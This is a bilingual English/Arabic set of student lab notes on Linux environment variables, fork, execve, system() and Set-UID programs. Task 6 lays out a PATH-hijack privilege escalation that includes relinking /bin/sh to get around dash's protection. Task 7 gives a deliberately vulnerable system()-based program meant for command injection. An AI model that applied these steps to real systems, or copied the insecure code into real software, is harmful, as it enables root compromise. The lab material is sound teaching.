# 🛠️ Lab Setup & Fundamentals: Environment Variables (Task 1 - Step 1)

Welcome to the documentation for **Task 1: Step 1**! This README provides a concise, clear, and bilingual (English & Arabic) reference guide covering Environment Variables in Linux/Unix systems, command usage, and key distinctions for exam preparation and practical labs.

---

## 📖 English Summary

### 1. What is an Environment Variable?
An **Environment Variable** is a dynamic named value stored within the operating system environment. It follows a **`KEY=VALUE`** pair structure and provides context/configuration to applications and terminal sessions without modifying code.

> **Key Takeaway:** While paths (like directory locations) are very common stored values, environment variables can store *any* string or setting (e.g., username, default editor, active language, port numbers, or API keys).

---

### 2. Frequently Used Environment Variables
* `PWD`: Stores the **P**resent **W**orking **D**irectory (the full absolute path of where you currently are).
* `HOME`: Stores the absolute path to the current user's home directory (e.g., `/home/username`).
* `PATH`: Contains a colon-separated list of directories where the system searches for executable commands/programs.
* `USER`: Holds the name of the currently logged-in user.

---

### 3. Key Commands & Differences

#### A. Printing Environment Variables
* `printenv` (or `env`): Lists **all** environment variables currently set in your active shell session.
* `printenv PWD` or `echo $PWD`: Prints the value of a specific environment variable.

#### B. The Difference Between `pwd` and `$PWD`

| Feature / Aspect | `pwd` (Command) | `$PWD` (Environment Variable) |
| :--- | :--- | :--- |
| **Type** | Built-in Shell Command / Executable Binary | Shell Environment Variable (`KEY=VALUE`) |
| **How it Works** | Actively queries the Operating System kernel to calculate/return the current directory path. | Holds the pre-stored path string in memory, updated by the shell whenever you change directories (`cd`). |
| **Usage** | Executed directly: `pwd` | Evaluated/printed: `echo $PWD` or `printenv PWD` |
| **Under the Hood** | Evaluates current process working directory. | Evaluated as a variable expansion (`$`). |

---

---

## 📖 الشرح باللغة العربية (Arabic Summary)

### 1. ما هو متغير البيئة (Environment Variable)؟
**متغير البيئة (Environment Variable)** هو عبارة عن قيمة ديناميكية ذات اسم محدد يتم تخزينها داخل نظام التشغيل على شكل **`KEY=VALUE`** (اسم وقيمة). الهدف منه هو إعطاء البرامج وأوامر الشل (Shell) معلومات وإعدادات عن بيئة العمل دون الحاجة لتغيير الكود برمجياً.

> **ملاحظة مهمة:** المسارات (Paths) هي أشهر الاستخدامات لمتغيرات البيئة، ولكنها **ليست الاستخدام الوحيد**. متغيرات البيئة يمكن أن تخزن أي نص أو إعداد (مثل اسم المستخدم، اللغة، المنفذ Port، أو مفاتيح الـ API).

---

### 2. أشهر متغيرات البيئة المستخدمة
* `PWD`: يخزن المسار الحالي الذي تتواجد فيه الآن (**P**resent **W**orking **D**irectory).
* `HOME`: يخزن المسار الرئيسي لمجلد المستخدم (مثال: `/home/username`).
* `PATH`: يخزن قائمة المسارات التي يبحث فيها النظام عن الأوامر والبرامج القابلة للتشغيل.
* `USER`: يخزن اسم المستخدم الحالي في الجلسة.

---

### 3. الأوامر الأساسية والفروقات المهمة

#### أ. طباعة متغيرات البيئة
* `printenv` (أو `env`): يطبع **جميع** متغيرات البيئة الموجودة في جلسة الشل الحالية.
* `printenv PWD` أو `echo $PWD`: يطبع قيمة متغير بيئة **محدد** (في هذه الحالة المسار الحالي).

#### ب. الفرق بين الأمر `pwd` والمتغير `$PWD`

| وجه المقارنة | الأمر `pwd` (Small) | المتغير `$PWD` (Capital) |
| :--- | :--- | :--- |
| **النوع** | أمر تنفيذ مباشر داخل الشل (Executable Command / Built-in) | متغير بيئة ديناميكي مخزن بالنظام (Environment Variable) |
| **طريقة العمل** | ينادي نظام التشغيل (Kernel) للاستعلام عن المسار الحالي لحظياً وفحصه. | يقرأ القيمة النصية المخزنة سابقاً في الذاكرة والتي يحدّثها الشل تلقائياً عند التجميع أو الانتقال (`cd`). |
| **طريقة الاستدعاء** | يُكتب مباشرة: `pwd` | يُطبع باستخدام الـ Eco أو Printenv: `echo $PWD` أو `printenv PWD` |

---

## 🎯 Quick Exam / Lab Checklist (مراجعة سريعة للامتحان)
- [x] Know how to list environment variables using `printenv`.
- [x] Understand that Environment Variables store dynamic settings (`KEY=VALUE`), not just directory paths.
- [x] Remember that `pwd` is an action/command, whereas `$PWD` is a dynamic stored variable evaluated with `$`.


# 🛠️ Task 1 - Step 2: Creating, Verifying, and Unsetting Environment Variables

This guide covers how to define a custom environment variable, check its value, delete it, and verify that it has been removed.

---

## 1. Creating an Environment Variable
To create a shell variable, assign a value to a variable name without spaces around the `=` sign.

```bash
# إنشاء متغير جديد وتخزين قيمة فيه (ملاحظة: بدون مسافات حول إشارة =)
MY_VAR="Hello World"
```

> **Note:** By default, a variable created this way is a **local shell variable**. To make it available to child processes and subshells, export it:
> ```bash
> export MY_VAR="Hello World"
> ```

---

## 2. Printing and Verifying the Variable
To view the contents of the variable, use `echo` with a `$` prefix, or query it using `printenv`.

```bash
# طباعة قيمة المتغير للتحقق من إنشائه بنجاح
echo $MY_VAR
# Output: Hello World

# أو باستخدام printenv (إذا تم تصديره export)
printenv MY_VAR
# Output: Hello World
```

---

## 3. Deleting (Unsetting) the Variable
To completely remove the variable from the environment/shell session, use the `unset` command.

```bash
# حذف المتغير نهائياً من الجلسة الحالية
unset MY_VAR
```

---

## 4. Confirming Deletion
Verify that the variable no longer exists by attempting to print it again. It should return an empty output.

```bash
# التأكد من الحذف - لن يطبع شيئاً لأن المتغير لم يعد موجوداً
echo $MY_VAR
# Output: (blank line)
```

---

## 🎯 Quick Command Checklist
| Action | Command | Arabic Note |
| :--- | :--- | :--- |
| **Create** | `MY_VAR="Value"` | إنشاء المتغير |
| **Export** | `export MY_VAR` | تحويله لمتغير بيئة عام |
| **Print** | `echo $MY_VAR` | طباعة القيمة وفحصها |
| **Delete** | `unset MY_VAR` | حذف المتغير |
| **Verify** | `echo $MY_VAR` (Empty) | التأكد من مسحه تماماً |

# Task 2: Environment Variables and Process Inheritance (fork)
## متغيرات البيئة وتوريث العمليات عبر fork

---

## 📌 Executive Summary | ملخص تنفيذي

This repository documents the implementation, execution, and deep technical logic of **Task 2** in the Environment Variable and Set-UID Lab. The primary objective is to investigate whether a child process created via `fork()` inherits the environment variables from its parent process.

يقدم هذا المستند توثيقاً شاملاً وتفصيلياً لتنفيذ **المهمة الثانية (Task 2)** من مختبر متغيرات البيئة. الهدف الأساسي من هذه المهمة هو التحقق العملي والبرمجي مما إذا كانت العملية الابن (Child Process) المنشأة عبر الأمر `fork()` ترث جميع متغيرات البيئة (Environment Variables) من العملية الأم (Parent Process).

---

## 💡 Fundamental Concepts | المفاهيم الأساسية

### 1. What is `fork()`? | ما هو أمر `fork()`؟
- **English:** `fork()` is a system call in Unix-like operating systems that creates a new process by duplicating the calling process. The original process is called the **Parent Process**, and the new process is called the **Child Process**.
- **العربية:** أمر `fork()` هو استدعاء نظام (System Call) في أنظمة UNIX/Linux يستنسخ العملية الحالية لإيجاد عملية جديدة. العملية الأصلية تُسمى **الأب (Parent Process)**، والعملية الجديدة المنسوخة تُسمى **الابن (Child Process)**.

### 2. Environment Variables & `environ` Pointer Array | مصفوفة متغيرات البيئة
- **English:** Environment variables are key-value pairs (`KEY=VALUE`) stored in memory that define the execution environment. In C, these variables are accessible via an external global pointer array named `extern char **environ`.
- **العربية:** متغيرات البيئة هي قيم حيوية للنظام (`KEY=VALUE`) مخزنة في الذاكرة لتحديد خصائص بيئة التشغيل. في لغة C، يتم الوصول لهذه المتغيرات عبر مصفوفة مؤشرات عامة تُدعى `extern char **environ`.

---

## 🔬 Core Methodology & Logic | المنهجية وفلسفة التجربة

To prove whether the Child process inherits environment variables intact from the Parent, we follow a 3-step isolation approach:

لإثبات توريث متغيرات البيئة عملياً وبدون أي التباس، اتبعنا منهجية محددة تتكون من ثلاث خطوات:

1. **Step 1 (Isolate Child Output):** Configure the program `myprintenv.c` so only the **Child process** prints its environment variables, redirecting the output to `file1`.
2. **Step 2 (Isolate Parent Output):** Modify `myprintenv.c` using `nano` so only the **Parent process** prints its environment variables, redirecting the output to `file2`.
3. **Step 3 (Compare Outputs):** Execute `diff file1 file2`. If no differences are outputted, it confirms that both processes hold an identical set of environment variables.

---

## 💻 Code Structure Analysis | تحليل كود `myprintenv.c`

```c
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

extern char **environ;

void printenv()
{
    int i = 0;
    while (environ[i] != NULL) {
        printf("%s\n", environ[i]);
        i++;
    }
}

void main()
{
    pid_t childPid;
    switch(childPid = fork()) {
        case 0:  /* child process */
            printenv();
            exit(0);
        default: /* parent process */
            // printenv();
            exit(0);
    }
}
```

### Explanation | الشرح:
- `fork()` returns `0` inside the Child process, matching `case 0:`.
- `fork()` returns the Child's PID inside the Parent process, matching `default:`.
- By toggling comments (`//`) between `case 0:` and `default:`, we control which process executes `printenv()`.

---

## 🛠️ Step-by-Step Implementation Guide | دليل التنفيذ خطوة بخطوة

### Step 1: Capture Child Process Output
1. Compile the source code:
   ```bash
   gcc myprintenv.c -o myprintenv
   ```
2. Execute the program and save the Child's output to `file1`:
   ```bash
   ./myprintenv > file1
   ```
3. Verify that `file1` contains environment variables:
   ```bash
   cat file1
   ```

---

### Step 2: Modify Code & Capture Parent Process Output
1. Open the file in `nano` editor:
   ```bash
   nano myprintenv.c
   ```
2. Toggle the `printenv()` call:
   - Comment out `printenv()` under `case 0:` (`// printenv();`).
   - Uncomment `printenv()` under `default:` (`printenv();`).
   - Save (`Ctrl + O`, `Enter`) and Exit (`Ctrl + X`).

3. Re-compile the code and redirect the Parent's output to `file2`:
   ```bash
   gcc myprintenv.c -o myprintenv
   ./myprintenv > file2
   ```

---

### Step 3: Compare Outputs using `diff`
1. Run the comparison command:
   ```bash
   diff file1 file2
   ```
2. **Observed Result:** The shell returns **no output** (a clean blank line).

---

## 🎯 Final Conclusion & Key Takeaways | الاستنتاج النهائي والنتيجة

- **Why did `diff file1 file2` produce no output?**
  In Linux/Unix shells, the `diff` utility produces no output when two files are 100% identical. 

- **Why are `file1` and `file2` identical?**
  When `fork()` is executed, the operating system creates an exact duplicate memory space for the Child process, copying the `environ` pointer array as-is. Since neither the Parent nor the Child modified any environment variables during execution, their environment tables remain identical.

- **الاستنتاج الرئيسي بالعربية:**
  عدم ظهور أي فروقات عند تطبيق الأمر `diff file1 file2` يُعد **إثباتاً علمياً وتطبيقياً قاطعاً** على أن نظام التشغيل يُورّث مصفوفة متغيرات البيئة (`environ`) بالكامل من العملية الأم (Parent) إلى العملية الابن (Child) لحظة استدعاء `fork()`.


# Task 3: Environment Variables and `execve()`
## متغيرات البيئة واستدعاء النظام `execve()`

---

## 📌 Executive Summary | ملخص تنفيذي

This document details the practical implementation, execution steps, and technical core concepts of **Task 3** in the Environment Variable and Set-UID Lab. While Task 2 focused on process duplication via `fork()`, Task 3 investigates how environment variables behave when a process executes a brand-new program using the `execve()` system call.

 **المهمة الثالثة (Task 3)** من مختبر متغيرات البيئة. بعد أن درسنا في Task 2 عملية استنساخ العمليات عبر `fork()`، ننتقل في هذه المهمة لدراسة سلوك متغيرات البيئة عند تشغيل برنامج جديد كلياً داخل نفس العملية باستخدام استدعاء النظام `execve()`.

---

## 💡 Core Concept & Fundamental Difference | المفهوم الأساسي والفرق الجوهري

### 1. What does `execve()` actually do? | ماذا يفعل الأمر `execve()`؟
- **English:** The `execve()` system call loads and executes a new program inside the current calling process. It completely overwrites the existing memory space (code, data, heap, and stack) with the new executable. It **does not** create a new process or a new PID.
- **العربية:** يقوم الاستدعاء `execve()` باستدعاء برنامج جديد من القرص الصلب وزرعه داخل العملية الحالية. إنه يقوم بمسح وإعادة كتابة (Overwrite) كل ذاكرة البرنامج القديم (الكود، البيانات، الذاكرة المؤقتة) واستبدالها بالبرنامج الجديد. **هذا الأمر لا ينشئ عملية جديدة (No new process / No new PID)**.

---

### 2. Task 2 vs. Task 3 Comparison | مقارنة جوهرية بين المهمتين

| Feature / الخصائص | Task 2: `fork()` | Task 3: `execve()` |
| :--- | :--- | :--- |
| **Operation / العملية** | Duplicates current process (Parent & Child). | Overwrites current process memory with a new program. |
| **New Process Created?** | Yes (Creates a new Child process). | No (Runs inside the same existing process space). |
| **Env Vars Behavior** | Inherited **automatically** by Child. | **Not inherited automatically**; must be passed explicitly. |
| **السلوك بالنسبة للمتغيرات** | تتورث تلقائياً للابن دون تدخل من المبرمج. | لا تنتقل تلقائياً للبرنامج الجديد؛ يجب تمريرها يدوياً. |

---

## 💻 Code Analysis (`myenv.c`) | تحليل الكود البرمجي

```c
#include <unistd.h>
#include <stdio.h>

extern char **environ;

int main()
{
    char *argv[2];

    argv[0] = "/usr/bin/env";
    argv[1] = NULL;

    // Line A: Executing the new program
    execve("/usr/bin/env", argv, NULL);   

    return 0;
}
```

### Line-by-Line Explanation | شرح السطر بالسطر:
1. `extern char **environ;`: Global pointer array holding the current process's environment variables.
2. `argv[0] = "/usr/bin/env";`: Specifies the binary executable to run (`/usr/bin/env` prints all environment variables).
3. `argv[1] = NULL;`: Required in C to terminate the argument list properly.
4. `execve(const char *filename, char *const argv[], char *const envp[]);`:
   - **1st Parameter:** Path to the target executable (`"/usr/bin/env"`).
   - **2nd Parameter:** Arguments array (`argv`).
   - **3rd Parameter:** Environment variables array (`envp`). **This is Line A!**

---

## 🛠️ Step-by-Step Implementation Guide | دليل التنفيذ والخطوات

### 🔹 Step 1: Execute with `NULL` (Passing No Environment Variables)
1. Keep `Line A` as: `execve("/usr/bin/env", argv, NULL);`
2. Compile and run the program:
   ```bash
   gcc myenv.c -o myenv
   ./myenv
   ```
3. **Observed Result (الملاحظة):** The terminal returns a **completely blank screen** (no output).
4. **Why? (السبب):** Passing `NULL` as the 3rd parameter instructs `execve()` to load the new program `/usr/bin/env` with an **empty environment variable table**.

---

### 🔹 Step 2: Execute with `environ` (Passing Current Environment Variables)
1. Open the file in `nano`:
   ```bash
   nano myenv.c
   ```
2. Modify `Line A` to pass the `environ` array:
   ```c
   execve("/usr/bin/env", argv, environ);
   ```
3. Save (`Ctrl + O` -> `Enter`) and Exit (`Ctrl + X`).
4. Re-compile and run:
   ```bash
   gcc myenv.c -o myenv
   ./myenv
   ```
5. **Observed Result (الملاحظة):** All current environment variables are **printed completely** to the terminal.
6. **Why? (السبب):** Passing `environ` as the 3rd parameter explicitly hands over the parent environment table to the new program.

---

## 🎯 Final Conclusion & Key Takeaways | الاستنتاج النهائي للمُتعلّم

- **English Answer to Step 3:**
  Unlike `fork()`, the `execve()` system call **does not automatically pass environment variables** to the newly executed program. The new program receives its environment variables strictly through the 3rd argument passed into `execve()`. If `NULL` is provided, the new program executes with no environment variables. If `environ` is provided, it inherits the caller's environment.

- **الخلاصة النهائية بالعربية:**
  على عكس `fork()` التي تورّث متغيرات البيئة أوتوماتيكياً، فإن أمر `execve()` **لا يُنقِل متغيرات البيئة للبرنامج الجديد تلقائياً**. الطريقة الوحيدة لتمكين البرنامج الجديد من معرفة واستخدام متغيرات البيئة هي أن يمررها المبرمج بيده كخيار ثالث (`environ`) داخل دالة `execve()`.


# Task 4: Environment Variables and `system()`

---

## Executive Summary | ملخص تنفيذي

This document covers the implementation, theoretical background, and execution behavior of **Task 4** in the Environment Variable and Set-UID Lab. Task 4 examines how environment variables are passed to a new program executed via the standard C library function `system()`, highlighting the underlying mechanics that distinguish it from direct system calls like `execve()`.

يغطي هذا المستند الجانب التطبيقي والمفاهيمي والتنفيذي للمهمة الرابعة (**Task 4**) ضمن مختبر متغيرات البيئة. تهدف هذه المهمة إلى دراسة كيفية انتقال متغيرات البيئة إلى برنامج جديد يتم تشغيله باستخدام دالة `system()`، مع توضيح الآلية الداخلية التي تجعل سلوكها مختلفاً عن الاستدعاء المباشر للنظام مثل `execve()`.

---

## Core Concepts & Architectural Logic | المفاهيم الأساسية والآلية البرمجية

### 1. How `system()` Works Under the Hood | الآلية الداخلية لدالة `system()`
* **Direct Execution vs. Shell Execution:** 
  Unlike `execve()`, which executes a binary directly without an intermediary, the `system("command")` function executes a shell command by invoking the Unix shell:
  
  $$	ext{system("command")} \longrightarrow 	ext{executes: } 	ext{/bin/sh -c "command"}$$

* **Internal Mechanics:** 
  Inside the standard C library implementation, `system()` uses `fork()` to create a child process, and then uses `execl()` (which internally calls `execve()`) to run `/bin/sh`. Crucially, `system()` explicitly passes the global environment array `environ` to the shell. As a result, any command executed through `system()` automatically inherits the environment variables of the calling process.

---

### 2. Task 3 vs. Task 4 Comparison | مقارنة بين المهمة الثالثة والمهمة الرابعة

| Feature / الخاصية | Task 3: `execve()` | Task 4: `system()` |
| :--- | :--- | :--- |
| **Execution Path / مسار التنفيذ** | Direct binary execution (No shell). | Executes via command interpreter `/bin/sh`. |
| **Environment Variable Passing** | Explicitly manual (Requires `environ` array). | Automatic (Handled internally by `system()`). |
| **Security & Overhead** | Lower overhead, more secure. | Higher overhead, introduces shell vulnerability risks. |
| **الأثر العملي** | لا تُمرر المتغيرات إلا بتحديدها يدوياً. | تُمرر المتغيرات أوتوماتيكياً للبرنامج الجديد. |

---

## Code Structure & Line-by-Line Analysis | تحليل الكود البرمجي

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
    system("/usr/bin/env");
    return 0;
}
```

### Detailed Breakdown | الشرح التفصيلي للكود:
* `#include <stdlib.h>`: Provides the function prototype for `system()`.
* `system("/usr/bin/env");`: Invokes `/bin/sh -c /usr/bin/env`. The command `/usr/bin/env` reads and prints all active environment variables inherited by the shell process.
* `return 0;`: Indicates successful execution and program termination.

---

## Implementation & Execution Guide | دليل التنفيذ والخطوات التطبيقية

### Step 1: Create the Source File
Open the `nano` editor to create `mysystem.c`:
```bash
nano mysystem.c
```
Paste the code above, save (`Ctrl + O`, then `Enter`), and exit (`Ctrl + X`).

---

### Step 2: Compile the Program
Compile `mysystem.c` using `gcc`:
```bash
gcc mysystem.c -o mysystem
```

---

### Step 3: Execute and Verify
Run the compiled executable:
```bash
./mysystem
```

---

## Observed Results & Evidence | النتائج الملاحظة والإثبات التطبيقي

Upon running `./mysystem`, the terminal immediately displays the full list of active environment variables (e.g., `PATH`, `SHELL`, `USER`, `PWD`).

عند تشغيل البرنامج، تظهر قائمة متغيرات البيئة الحالية كاملة على الشاشة فوراً دون الحاجة إلى تمرير `environ` يدوياً في الكود.

---

## Conclusion | الاستنتاج العلمي النهائي

Environment variables are **automatically inherited** by programs executed through the `system()` function. This occurs because `system()` delegates execution to `/bin/sh` using an internal `execve()` call that automatically includes the caller's environment variable array (`environ`).

تنتقل متغيرات البيئة **أوتوماتيكياً** إلى البرامج والأوامر المنفذة عبر دالة `system()`. يعود السبب في ذلك إلى أن دالة `system()` تعتمد في بنيتها الداخلية على تشغيل غلاف النظام (`/bin/sh`) وتمرير مصفوفة المتغيرات الحالية `environ` إليه بشكل تلقائي وضمني.


# Task 5: Environment Variables and Set-UID Programs

---

## 📌 1. Overview & Conceptual Understanding (نظرة عامة وفهم المفاهيم)

In Unix-like operating systems, a **Set-UID (Set User ID)** program is a special executable that runs with the privileges of the file owner (typically `root`) rather than the privileges of the user executing it. This allows unprivileged users to perform specific administrative operations safely (e.g., changing their password using `/usr/bin/passwd`).

However, passing environment variables from an unprivileged user process to a root-privileged Set-UID program presents severe security risks:
* **The Security Threat:** If a Set-UID program trusts user-controlled environment variables like `LD_LIBRARY_PATH` (which specifies additional search paths for dynamic shared libraries), an attacker could force the privileged program to load a malicious library from a user-controlled directory (such as `/tmp`), leading to **Privilege Escalation** and total system compromise.
* **The Defense Mechanism:** To mitigate this risk, the Linux dynamic linker/loader (`ld.so` / `ld-linux.so`) automatically inspects the execution context. When it detects that a binary has the Set-UID bit set, it **sanitizes the environment** by stripping out sensitive/dangerous variables (such as `LD_LIBRARY_PATH`), while permitting standard, non-critical variables (such as `PATH`) to be inherited.

---

برامج الـ **Set-UID** هي برامج تنفيدية في نظام لينكس تتميز بخاصية أمنية فريدة: عند تشغيلها من قبل أي مستخدم عادي، تنفّذ العملية **بصلاحيات مالك الملف الأصلي** (والذي يكون عادةً الـ `root`) بدلاً من صلاحيات المستخدم الذي قام بتشغيلها. مثال شهير على ذلك هو أمر `passwd` الذي يسمح للمستخدم العادي بتعديل كلمة سرّه المكتوبة داخل ملف `/etc/shadow` المخصص فقط للـ Root.

**لماذا تُشكل متغيرات البيئة خطراً أمنياً هنا؟**
* **التهديد الأمني:** عندما يقوم مستخدم عادي بتشغيل برنامج Set-UID، تحاول العملية الأب (Shell) تمرير كافة متغيرات البيئة الخاضعة لسلطة المستخدم إلى البرنامج الجديد. لو قام مستخدم خبيث لتعديل متغير حساس مثل `LD_LIBRARY_PATH` (المسؤول عن توجيه النظام لمكان استدعاء المكتبات البرمجية) وأشار به إلى مجلد ضار مثل `/tmp` يحتوي على مكتبة ملغومة، فإن البرنامج (الذي يعمل كـ Root) سيعالج الكود الخبيث، مما يؤدي إلى ثغرة **تصعيد الصلاحيات (Privilege Escalation)** واختراق النظام بالكامل.
* **آلية الدفاع في لينكس:** للوقاية من هذه الكارثة الأمنية، يتضمن المترجم الديناميكي في لينكس (`ld.so`) حماية تلقائية؛ فعند ملاحظة أن البرنامج يعمل بفرقية Set-UID، يقوم بـ **تصفية وتجريد (Sanitize/Strip)** المتغيرات الخطيرة مثل `LD_LIBRARY_PATH` وحذفها فوراً قبل بدء التنفيذ، بينما يمسح بمرور المتغيرات العادية والآمنة مثل `PATH`.

---

## 🛠️ 2. Step-by-Step Implementation & Commands (الخطوات التطبيقية والأوامر)

### Step 1: Create the C Source File (`foo.c`)
Create a simple C program that iterates through and prints all environment variables passed to the process.

```bash
nano foo.c
```

**Code (`foo.c`):**
```c
#include <stdio.h>
#include <stdlib.h>

extern char **environ;

int main()
{
    int i = 0;
    while (environ[i] != NULL) {
        printf("%s\n", environ[i]);
        i++;
    }
    return 0;
}
```

---

### Step 2: Compile the Program
Compile the source code into an executable file named `foo`:

```bash
gcc foo.c -o foo
```

---

### Step 3: Change Ownership and Enable Set-UID Privilege
Change the owner of `foo` to `root` and set the Set-UID permission bit (`4755`):

```bash
sudo chown root foo
sudo chmod 4755 foo
```

**Verification:**
Verify that the permission bit is properly set:

```bash
ls -l foo
```
*Expected Output permissions:* `-rwsr-xr-x 1 root ... foo` (Notice the `s` in the owner permission field).

---

### Step 4: Export Environment Variables as Regular User (`seed`)
Export both a standard variable (`PATH`) and a sensitive/restricted variable (`LD_LIBRARY_PATH`):

```bash
export PATH=$PATH:/home/seed
export LD_LIBRARY_PATH=/tmp
```

---

### Step 5: Execute and Filter Output
Run the Set-UID binary and inspect if the exported environment variables were inherited:

```bash
./foo | grep PATH
./foo | grep LD_LIBRARY_PATH
```

---

## 📊 3. Practical Verification & Results (النتائج والتطبيق العملي)

### Terminal Verification Matrix:

| Tested Environment Variable | Modified Value / Set Value | Inherited by Set-UID Binary? | System Security Action Taken |
| :--- | :--- | :---: | :--- |
| **`PATH`** | `$PATH:/home/seed` | **YES (Inherited)** | Permitted. `PATH` is non-sensitive for library linking. |
| **`LD_LIBRARY_PATH`** | `/tmp` | **NO (Stripped Out)** | Blocked. Automatically purged by `ld.so` dynamic linker. |

---

### Output Analysis (تحليل المخرجات):

1. **`PATH` Output:**
   ```text
   PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:.:/home/seed
   ```
   * **Observation:** The appended path `:/home/seed` is explicitly visible in the program's printed environment.
   * **Reasoning:** Modifying `PATH` does not directly manipulate binary memory loading or shared object linking within execution time.

2. **`LD_LIBRARY_PATH` Output:**
   ```text
   (No output returned)
   ```
   * **Observation:** Executing `./foo | grep LD_LIBRARY_PATH` produces an empty output.
   * **Reasoning:** The Linux dynamic linker (`ld.so`) detects execution under elevated Set-UID conditions (`euid != ruid`) and silently drops `LD_LIBRARY_PATH` to guarantee security integrity.

---

##  4. Summary & Lab Deliverables (الخلاصة والتقرير النهائي)

### Key Takeaways (النقاط الأساسية للتقرير):
* **Inheritance Rules:** Set-UID programs do **not** inherit environment variables unconditionally.
* **Security Sanitization:** The operating system's dynamic linker automatically cleanses potentially hazardous variables (`LD_LIBRARY_PATH`, `LD_PRELOAD`, etc.) to prevent malicious shared object injection.
* **Privilege Separation:** Users cannot utilize custom dynamic link paths to execute untrusted binaries under elevated root privileges.


# Task 6: The PATH Environment Variable and Set-UID Programs

---

## 📌 1. Overview & Conceptual Understanding

In Unix-like systems, when a C program invokes a system command using `system("ls")`, the `system()` function executes `/bin/sh -c ls`. The shell program does not search the entire filesystem to find where `ls` resides; instead, it relies on the user-defined `PATH` environment variable, searching through specified directories from left to right.

If a Set-UID program uses a **relative path** (such as `ls`) rather than an **absolute path** (such as `/bin/ls`), an attacker can manipulate the `PATH` environment variable by prefixing it with a directory containing a malicious binary named `ls`. Consequently, when the Set-UID binary runs, it inadvertently executes the attacker's malicious binary with elevated `root` privileges.

---

برامج الـ **Set-UID** التي تعتمد على دالة `system()` لتنفيذ أوامر النظام تحتوي على ثغرة أمنية حرجة إذا استخدم المبرمج **مساراً نسبياً** للأمر (مثل `ls`) بدلاً من **المسار المطلق الكامل** (مثل `/bin/ls`). 

عند تنفيذ `system("ls")`، تبحث بيئة العمل (Shell) عن ملف `ls` التنفيذي بقراءة المجلدات المسجلة في متغير البيئة **`PATH`** بالترتيب من اليسار إلى اليمين. ونظراً لأن متغير `PATH` يُورّث من حساب المستخدم العادي إلى برنامج الـ Set-UID (كما أثبتنا في Task 5)، يمكن للمستخدم الخبيث إنشاء برمجية خبيثة باسم `ls` وتعديل متغير `PATH` بوضع مجلده الشخصي في أول القائمة. عندئذٍ، ينفذ برنامج الـ Set-UID الكود الخبيث **بصلاحيات الـ Root الكاملة**، مما يؤدي إلى ثغرة تصعيد الصلاحيات (Privilege Escalation).

> **ملاحظة أمنية حول حماية النظام (Countermeasure):**
> تُمثل `/bin/sh` في نظام أوبونتو رابطاً رمزياً للـ Dash Shell (`/bin/dash`). يتضمن Dash حماية تلقائية تُسقط صلاحيات الـ Root فوراً عند اكتشاف تشغيله ضمن عملية Set-UID. لاختبار إمكانية استغلال الثغرة في الأنظمة التي تفتقر لهذه الحماية، تم توجيه `/bin/sh` مؤقتاً إلى Zsh (`/bin/zsh`).

---

## 🛠️ 2. Step-by-Step Implementation & Commands

### Step 1: Create the Vulnerable Set-UID C Program (`task6.c`)
Create a C program that executes the `ls` command using a relative path.

```bash
nano task6.c
```
* Source Code (task6.c):
```bash
#include <stdlib.h>

int main()
{
    system("ls");
    return 0;
}
```
* Compile, set ownership to root, and enable Set-UID privileges:
```text
gcc task6.c -o task6
sudo chown root task6
sudo chmod 4755 task6
```
### Step 2: Relink /bin/sh to zsh (Bypass Dash Countermeasure)
Bypass the built-in Dash defense mechanism by linking /bin/sh to zsh:

```Bash
sudo ln -sf /bin/zsh /bin/sh
```
### Step 3: Create the Malicious Binary (ls.c)
Create a malicious program in the user's home directory (/home/seed/ls.c) that prints a compromised status message and outputs process credentials using system("id").
```text
nano /home/seed/ls.c
```
* Source Code (ls.c):
```text
#include <stdio.h>
#include <stdlib.h>

int main() {
    printf("=== HACKED! Executing malicious code as Root ===\n");
    system("id");
    return 0;
}
```
* Compile the malicious code into an executable named ls inside /home/seed:
```text

gcc /home/seed/ls.c -o /home/seed/ls
chmod +x /home/seed/ls
```

### Step 4: Manipulate the PATH Environment Variable
Prepend the directory containing the malicious executable (/home/seed) to the PATH variable:

```Bash
export PATH=/home/seed:$PATH
```
### Step 5: Execute the Vulnerable Set-UID Binary
Run the Set-UID executable to observe the attack execution:

```text
./task6
```


# Task 7: Invoking External Programs Using system() versus execve()

---

## 📌 1. Overview & Conceptual Understanding

Both `system()` and `execve()` function calls are utilized to execute external binaries within C programs. However, their underlying execution behavior introduces drastically different security implications, especially in Set-UID privileged contexts:

* **`system(command)` Vulnerability:** The `system()` function works by passing the command string directly to a shell binary (e.g., `/bin/sh -c command`). Because the shell parses the string before execution, metacharacters such as semicolons `;`, logical ANDs `&&`, or pipes `|` are evaluated as command separators. This allows an attacker to perform **Command Injection**, appending arbitrary malicious commands that execute under inherited `root` privileges.
* **`execve(filename, argv, envp)` Defense:** The `execve()` system call directly invokes the target binary without invoking a shell command parser. It treats passed arguments strictly as input data rather than executable shell commands. Consequently, injected shell metacharacters lose their operational meaning, rendering Command Injection attacks completely ineffective.

---

تظهر هذه المهمة الفرق الجوهري في الأمان بين استخدام دالة `system()` ودالة `execve()` عند تنفيذ الأوامر الخارجية داخل برامج الـ Set-UID:

عند استخدام **`system()`**، يتم تمرير النص المكتوب إلى بيئة Shell (`/bin/sh`) لتفسيره. تقوم الـ Shell بمعالجة النص وتحليل الفواصل الأمنية مثل `;` مما يسمح للمهاجم بحقن أوامر إضافية (Command Injection) مثل أمر الحذف `rm` ليتم تنفيذها بصلاحيات الـ Root المرتفعة التي يحملها البرنامج.

على الجانب الآخر، فإن دالة **`execve()`** تنفذ البرنامج المطلوب مباشرة دون الاستعانة بـ Shell parser. يتم التعامل مع جميع المدخلات والمُعاملات كبيانات مجردة (Data) وليس كأوامر قابلة للتفسير والتنفيذ، مما يلغي خطر ثغرة Command Injection بشكل كامل ويحافظ على أمان النظام.

---

## 🛠️ 2. Step-by-Step Implementation & Execution

### Part 1: Exploiting `system()` via Command Injection

#### Step 1: Create a Protected System File
Create a root-owned test file inside `/etc` that a standard user cannot modify or remove directly:
```bash
sudo touch /etc/zzz
```

### Step 2: Configure catall.c with system()
Create the C program using system():

```Bash
nano catall.c
```
* Source Code (catall.c - system version):
```text
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(int argc, char *argv[])
{
    char *v[3];
    char *command;

    if(argc < 2) {
        printf("Please type a file name.\n");
        return 1;
    }

    v[0] = "/bin/cat";
    v[1] = argv[1];
    v[2] = NULL;

    command = malloc(strlen(v[0]) + strlen(v[1]) + 2);
    sprintf(command, "%s %s", v[0], v[1]);

    system(command);

    return 0;
}
```
